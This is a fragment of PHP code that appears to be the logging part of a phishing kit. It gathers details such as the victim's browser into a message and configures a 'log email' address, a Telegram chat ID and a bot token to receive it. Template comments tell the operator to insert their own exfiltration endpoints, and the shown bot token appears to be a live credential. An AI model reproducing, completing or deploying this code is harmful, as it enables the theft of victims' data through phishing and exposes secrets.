...
$message .= "Browser --  ".$browser."\n";
  ...
  $email = "tools.jaiye@yandex.com";  //[YOUR LOG EMAIL GOES HERE]
 ...
 $chat_id = "7284131782";  //[YOUR TELEGRAM BOT CHAT ID GOES HERE]
 $bot_url = "7213310146:AAHSSKu4subE9_UCKmi8WaXbEPufcoe3MzY";  //[YOUR TELEGRAM BOT TOKEN GOES HERE]
 $txt = $message;
